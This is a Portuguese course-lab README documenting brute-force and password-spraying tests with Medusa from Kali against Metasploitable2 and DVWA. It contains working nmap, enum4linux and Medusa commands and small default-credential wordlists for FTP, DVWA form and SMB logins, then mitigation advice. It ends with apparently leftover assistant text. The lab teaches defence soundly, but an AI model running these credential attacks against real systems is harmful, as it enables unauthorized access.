# security-lab-cyber-santander
Projeto prático — Curso de Cibersegurança (Santander / DIO)

Laboratório de testes de força-bruta usando **Kali Linux** e **Medusa** contra ambientes vulneráveis (Metasploitable2 / DVWA). Este repositório documenta a montagem do laboratório, os testes executados, evidências coletadas e recomendações de mitigação.

---

## Visão geral
Este projeto reúne a aplicação prática dos conceitos vistos no curso: configurar um ambiente isolado, identificar serviços, executar ataques de força-bruta controlados e documentar resultados. O objetivo é aprender técnicas de auditoria e, principalmente, como mitigar as falhas exploradas.

> Ambiente 100% controlado para fins educacionais. Nunca execute testes em sistemas sem autorização explícita.

---

## Objetivos
- Entender e aplicar ataques de força-bruta e password spraying em serviços comuns (FTP, Web, SMB).
- Automatizar tentativas de autenticação com **Medusa** no Kali Linux.
- Registrar comandos, saídas e evidências (logs / screenshots).
- Propor medidas de mitigação e boas práticas de segurança.
- Publicar documentação técnica no GitHub como portfólio.

---

## Estrutura do repositório
```
/
├── README.md
├── images/            # capturas de tela (screenshots)
├── wordlists/         # wordlists usadas nos testes
├── scripts/           # scripts auxiliares (opcional)
├── relatorios/        # saídas de ferramentas e observações
└── evidencia/         # logs e outputs do Medusa, Nmap, enum4linux
```

Coloque imagens em `/images` e outputs em `/relatorios` ou `/evidencia` para manter o histórico dos testes.

---

## Ferramentas utilizadas
- **Kali Linux** (máquina atacante)
- **Medusa** (força-bruta automatizada)
- **Metasploitable 2** (alvo vulnerável)
- **DVWA** (Damn Vulnerable Web Application)
- **Nmap**, **enum4linux**, **smbclient**, **ftp** (ferramentas de enumeração/validação)

---

## Topologia (exemplo)
- Kali (atacante): `192.168.56.101`
- Metasploitable2 (alvo): `192.168.56.102`

> Recomenda-se usar `Host-only` ou `Internal Network` no VirtualBox para isolar o laboratório.

---

## Preparação do ambiente (resumido)
1. Criar duas VMs no VirtualBox: Kali e Metasploitable2.
2. Configurar os adaptadores em modo *Host-only* ou *Internal Network*.
3. Confirmar conectividade (`ping`).
4. Atualizar/instalar ferramentas no Kali:

```bash
sudo apt update && sudo apt install medusa nmap enum4linux smbclient ftp -y
```

---

## Reconhecimento (exemplos de comandos)
Salvar todas as saídas em `/relatorios`.

```bash
# Exibir IP
ip a

# Teste de conectividade
ping -c 3 192.168.56.102

# Varredura rápida em portas relevantes
nmap -sV -p 21,22,80,139,445,137 192.168.56.102 -oN relatorios/nmap_ports.txt

# Varredura completa com scripts básicos
nmap -sC -sV -p- 192.168.56.102 -oN relatorios/nmap_full.txt
```

---

## Cenários executados e comandos (substitua IPs e paths conforme seu ambiente)
> Coloque as wordlists em `wordlists/` (um item por linha). Use nomes descritivos para facilitar a rastreabilidade.

### 1) Brute-force FTP (Medusa)

```bash
# Exemplo de criação de listas
printf "msfadmin\nuser\nadmin\n" > wordlists/users_ftp.txt
printf "msfadmin\n123456\npassword\n" > wordlists/pass_ftp.txt

# Execução do Medusa contra FTP
medusa -h 192.168.56.102 -U wordlists/users_ftp.txt -P wordlists/pass_ftp.txt -M ftp -t 6 -T 30 -O evidencia/medusa_ftp.txt
```

Validar o sucesso abrindo uma sessão FTP manualmente com as credenciais encontradas.

### 2) Ataque a formulário web (DVWA)

Ajuste `PAGE` e `FAIL` conforme a resposta do formulário da sua instalação DVWA.

```bash
printf "admin\nuser\n" > wordlists/users_web.txt
printf "1234\npassword\nadmin\n" > wordlists/pass_web.txt

medusa -h 192.168.56.102 -U wordlists/users_web.txt -P wordlists/pass_web.txt -M http \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m PAGE:"/dvwa/login.php" -m FAIL:"Login failed" -t 5 -O evidencia/medusa_dvwa.txt
```

### 3) Password spraying / SMB

```bash
# Enumeração Samba
enum4linux -a 192.168.56.102 | tee relatorios/enum4linux.txt
smbclient -L //192.168.56.102 -U guest

# Preparar listas
printf "msfadmin\nuser\nservice\n" > wordlists/users_smb.txt
printf "password\n123456\nmsfadmin\n" > wordlists/pass_smb.txt

# Brute-force SMB (módulo smbnt, ajuste se necessário)
medusa -h 192.168.56.102 -U wordlists/users_smb.txt -P wordlists/pass_smb.txt -M smbnt -t 4 -O evidencia/medusa_smb.txt
```

---

## Boas práticas de documentação
- Grave a linha de comando exata, data/hora e saída (use `tee` ou os arquivos de saída do Medusa).  
- Screenshots: terminal, resultados e validação de acesso. Coloque em `/images`.
- Mantenha versões das wordlists usadas (nome e data).  
- Consolide observações e conclusões em `/relatorios/README-resultados.md`.

---

## Exemplo de resultados a incluir
- `relatorios/nmap_full.txt` — portas e serviços detectados.
- `relatorios/enum4linux.txt` — contas e informações SMB.
- `evidencia/medusa_*.txt` — logs de execução do Medusa com credenciais encontradas.
- `/images` — capturas que provem acesso (FTP, SMB, DVWA).

---

## Recomendações de mitigação (práticas aplicáveis)
- Bloqueio/limitação de tentativas (ex.: fail2ban, rate limiting).  
- Políticas de senha fortes (comprimento, complexidade) e rotação periódica.  
- Implementar MFA em serviços sensíveis.  
- Restringir serviços por firewall e reduzir a superfície de ataque.  
- Monitoramento e alertas para padrões de autenticação suspeitos.  
- Patching e hardening regular dos serviços.

---

## Aviso legal
Este material é apenas para estudo em ambiente controlado. O uso das técnicas descritas em redes ou sistemas sem autorização é ilegal e antiético.

---

## Referências
- Documentação oficial: Medusa, Kali Linux, DVWA, Metasploitable.  
- Materiais do curso DIO / Santander (slides e vídeos).  
- Guias e manuais do Nmap e ferramentas de enumeração.

---

## Autor e submissão
**Daniel Paiva** — Curso de Cibersegurança (Santander / DIO)
Data: 2025-11-10

---

Se desejar, posso também:
- Gerar um `relatorios/README-quick.md` com resumo para submissão; ou
- Criar os arquivos `wordlists/` e `relatorios/` com exemplos prontos para download.

Escolha uma das opções ou peça alterações no texto.

